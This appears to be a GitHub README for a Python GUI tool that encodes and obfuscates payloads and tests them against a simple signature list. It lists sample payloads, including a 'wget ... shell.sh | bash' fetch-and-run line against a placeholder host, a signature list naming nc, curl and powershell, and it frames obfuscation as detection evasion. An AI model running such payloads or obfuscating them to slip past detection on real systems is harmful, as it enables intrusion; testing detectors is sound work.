# 🎯 Payload Encoder & Obfuscation Framework

A powerful GUI-based payload encoding and obfuscation tool built with Python and Tkinter. This framework provides multiple encoding methods to help security researchers, penetration testers, and developers understand payload obfuscation techniques and test detection mechanisms.

## ✨ Features

### 📝 Multiple Encoding Methods
- **Base64 Encoding** - Standard base64 encoding for payload obfuscation
- **ROT13 Substitution** - Classic rotation cipher for text transformation
- **XOR Encryption** - XOR-based encryption with customizable keys
- **Hex Conversion** - Convert payloads to hexadecimal format
- **Unicode Encoding** - Encode payloads as Unicode escape sequences
- **Random Character Insertion** - Inject random characters for evasion
- **Character Splitting** - Split payload with custom separators
- **String Reversal** - Reverse payload characters

### 🔍 Detection Testing
- **Signature Detection** - Test encoded payloads against common malicious signatures
- **Detection Status** - Real-time feedback on whether payloads trigger detection
- **Comparison Tool** - Compare all encoding methods side-by-side
- **Signature List** - View all tested signatures for reference

### 💻 User Interface
- Modern dark-themed GUI with syntax highlighting
- Real-time encoding and detection feedback
- Copy-to-clipboard functionality
- Demo payload for testing
- Responsive layout with input and output panels

## 🚀 Quick Start

### Prerequisites
- Python 3.6 or higher
- Tkinter (usually included with Python)

### Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/payload-encoder-framework.git
cd payload-encoder-framework
```

2. Run the application:
```bash
python3 gui.py
```

Or with explicit Python3:
```bash
python gui.py
```

## 📖 Usage Guide

### Basic Workflow

1. **Enter Your Payload**
   - Paste or type your payload in the left input panel
   - Use "Load Demo" button to load an example payload

2. **Select Encoding Method**
   - Click any of the 8 encoding buttons (1-8)
   - Results appear in the right output panel

3. **Check Detection Status**
   - Each encoding shows detection results
   - Green checkmark (✓) = Not detected
   - Red X (❌) = Detected

4. **Compare All Methods**
   - Click "Compare All" to see detection rates for all encodings
   - Useful for finding the most effective obfuscation method

5. **Test Detection**
   - Click "Test Detection" to check original payload
   - View all signatures being tested against

6. **Copy Results**
   - Click "Copy Result" to copy output to clipboard
   - Paste encoded payload into your workflow

### Example Payloads

```
os.system('whoami')
exec('import os; os.system("dir")')
import subprocess; subprocess.call(['bash', '-c', 'id'])
wget http://example.com/shell.sh | bash
```

## 🛠️ Architecture

### Main Classes

#### `Encoder`
Handles all payload encoding operations with static methods:
- `base64_encode()` - Base64 encoding
- `rot13_encode()` - ROT13 cipher
- `xor_encode()` - XOR encryption
- `hex_encode()` - Hexadecimal conversion
- `unicode_encode()` - Unicode escape sequences
- `random_insert()` - Random character injection
- `char_split()` - Character splitting with separator
- `reverse_string()` - String reversal

#### `Tester`
Provides signature-based detection testing:
- Maintains list of common malicious signatures
- `test_detection()` - Tests payload against all signatures
- Returns detection status, matched signatures, and count

#### `PayloadEncoderGUI`
Main GUI application class:
- Builds the user interface with Tkinter
- Handles all user interactions and button callbacks
- Manages input/output operations
- Coordinates between Encoder and Tester classes

## 🔍 Detected Signatures

The framework tests against these common signatures:
```
exec, eval, system, os., import, subprocess, cmd, powershell,
bash, sh, rm, del, wget, curl, nc, ncat, /bin/, C:\, cmd.exe
```

Custom signatures can be added by modifying the `Tester` class.

## 📊 Comparison Matrix

| Method | Speed | Size | Evasion | Use Case |
|--------|-------|------|---------|----------|
| Base64 | Fast | Medium | Low | Simple obfuscation |
| ROT13 | Fast | Same | Low | Legacy systems |
| XOR | Medium | Medium | Medium | Symmetric encryption |
| Hex | Medium | Large | Medium | Low-level operations |
| Unicode | Medium | Very Large | Medium | Unicode-aware systems |
| Random Insert | Fast | Large | High | Evasion testing |
| Char Split | Fast | Medium | Low | Delimiter-based |
| Reverse | Fast | Same | Low | Simple reversal |

## 🎓 Educational Purpose

This tool is designed for:
- ✅ Security research and analysis
- ✅ Penetration testing (authorized)
- ✅ Educational purposes
- ✅ Malware analysis understanding
- ✅ Detection system testing

## ⚠️ Disclaimer

**This tool is provided for educational and authorized security testing purposes only.** 

- Use only on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Users are responsible for compliance with all applicable laws and regulations
- Always obtain written permission before testing on systems you don't own

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Contribution Ideas
- Add new encoding methods
- Improve detection signatures
- Enhance the GUI
- Add more comprehensive testing
- Write additional documentation

## 📝 Future Enhancements

- [ ] Custom signature management
- [ ] Batch processing for multiple payloads
- [ ] Encoding chaining (multiple methods in sequence)
- [ ] Command-line interface (CLI) version
- [ ] Database of known obfuscation techniques
- [ ] Real-time signature database updates
- [ ] Export results to various formats (JSON, CSV, HTML)
- [ ] Automated obfuscation scoring system

## 🐛 Bug Reports

Found a bug? Please open an issue on GitHub with:
- Description of the issue
- Steps to reproduce
- Expected vs actual behavior
- Your Python version and OS

## 📚 Resources

- [OWASP - Code Obfuscation](https://owasp.org)
- [Python Tkinter Documentation](https://docs.python.org/3/library/tkinter.html)
- [Security Evasion Techniques](https://attack.mitre.org)
- [Malware Analysis Fundamentals](https://malwaretips.com)

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

```
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software...
```

## 👤 Author

Created with ❤️ for security researchers and penetration testers

## 📧 Contact & Support

- **Issues**: Open an issue on GitHub
- **Discussions**: Use GitHub Discussions for questions
- **Security**: Report security vulnerabilities responsibly

---

**⭐ If you find this tool useful, please give it a star on GitHub!**

### Quick Links
- [Issues](https://github.com/yourusername/payload-encoder-framework/issues)
- [Discussions](https://github.com/yourusername/payload-encoder-framework/discussions)
- [Releases](https://github.com/yourusername/payload-encoder-framework/releases)

Made with 🔒 Security in Mind | 🐍 Pure Python | 🎨 Tkinter GUI
